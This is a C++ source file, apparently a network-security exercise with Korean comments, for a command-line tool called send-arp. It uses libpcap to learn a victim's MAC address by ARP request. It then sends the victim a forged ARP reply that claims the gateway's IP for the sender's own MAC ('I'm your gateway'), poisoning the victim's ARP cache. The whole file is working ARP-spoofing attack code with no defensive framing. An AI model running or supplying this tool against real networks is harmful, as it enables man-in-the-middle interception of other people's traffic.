// send-arp-main.cpp

#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "get_mac_ip.h"

#pragma pack(push, 1)
struct EthArpPacket {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp <interface> <sender ip> <target ip>\n");
    printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    // 나의 MAC주소, IP주소 가져오기
    char myMacStr[32] = {0, };
    char myIpStr[32] = {0, };
    if(get_mac(myMacStr, dev) < 0)
    {
        fprintf(stderr, "get_mac() Error!!\n");
        return -1;
    }
    if(get_ip_addr(myIpStr, dev) < 0)
    {
        fprintf(stderr, "get_ip_addr() Error!!\n");
        return -1;
    }
    Mac myMac = Mac(myMacStr);
    Ip myIp = Ip(myIpStr);
    
    Ip senderIp = Ip(argv[2]);  // victim
    Ip targetIp = Ip(argv[3]);  // target
    
    // sender의 MAC주소 알아오기
    
    // ARP Request 패킷 제작
    EthArpPacket sendPacket;

    sendPacket.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");  // 브로드캐스트
    sendPacket.eth_.smac_ = myMac;
    sendPacket.eth_.type_ = htons(EthHdr::Arp);

    sendPacket.arp_.hrd_ = htons(ArpHdr::ETHER);
    sendPacket.arp_.pro_ = htons(EthHdr::Ip4);
    sendPacket.arp_.hln_ = Mac::SIZE;
    sendPacket.arp_.pln_ = Ip::SIZE;
    sendPacket.arp_.op_ = htons(ArpHdr::Request);  // 리퀘스트 \('o')/ 브로드캐스트
    sendPacket.arp_.smac_ = myMac;
    sendPacket.arp_.sip_ = htonl(myIp);
    sendPacket.arp_.tmac_ = Mac("00:00:00:00:00:00");
    sendPacket.arp_.tip_ = htonl(senderIp);

    // 패킷 전송
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&sendPacket), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    // ARP Reply 패킷 수신
    EthArpPacket* recvPacket = NULL;
    
    while(true)
    {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }
        
        recvPacket = (EthArpPacket*)packet;  // 패킷을 가져와서
        
        if(recvPacket->eth_.type_ != htons(EthHdr::Arp))
            continue;  // ARP패킷이 아니면 건너 뛴다.
        if(recvPacket->arp_.op_ != htons(ArpHdr::Reply))
            continue;  // ARP Reply가 아니면 건너 뛴다.
        if( recvPacket->arp_.sip_ != htonl(senderIp) )
            continue;  // sender IP가 아니면 건너 뛴다.
        
        break;  // 찾았다!!
    }
    
    Mac senderMac = Mac(recvPacket->arp_.smac_);

    // 변조된 ARP Reply 패킷 제작
    sendPacket.eth_.dmac_ = senderMac;
    sendPacket.eth_.smac_ = myMac;
    sendPacket.eth_.type_ = htons(EthHdr::Arp);

    sendPacket.arp_.hrd_ = htons(ArpHdr::ETHER);
    sendPacket.arp_.pro_ = htons(EthHdr::Ip4);
    sendPacket.arp_.hln_ = Mac::SIZE;
    sendPacket.arp_.pln_ = Ip::SIZE;
    sendPacket.arp_.op_ = htons(ArpHdr::Reply);  // 리플라이 \\('v') 유니캐스트
    sendPacket.arp_.smac_ = myMac;
    sendPacket.arp_.sip_ = htonl(targetIp);  // I'm your gateway
    sendPacket.arp_.tmac_ = senderMac;
    sendPacket.arp_.tip_ = htonl(senderIp);
    
    // 패킷 전송
    res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&sendPacket), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    pcap_close(handle);
}
